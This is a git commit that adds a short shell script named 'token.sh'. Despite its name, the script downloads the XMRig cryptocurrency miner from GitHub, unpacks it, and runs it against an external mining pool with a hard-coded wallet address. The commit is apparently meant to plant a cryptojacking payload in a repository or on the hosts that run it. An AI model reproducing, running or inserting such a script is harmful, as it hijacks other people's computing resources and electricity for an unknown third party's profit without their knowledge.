af7c552afc12d3b55431a924d0666a8b92ba366d
dayderra <79746920+dayderra@users.noreply.github.com>
2021-06-07 10:54:22 +0300

    Create token.sh

---
+++ token.sh
@@ -0,0 +1,5 @@
+sudo art update
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
+tar -xf xmrig-6.12.1-linux-x64.tar.gz
+cd xmrig-6.12.1
+./xmrig -o rx.unmineable.com:3333 -u WIN:THFAHsVMnsBLjKxwoZNqMv2w3ec4BUVDVt -p -1
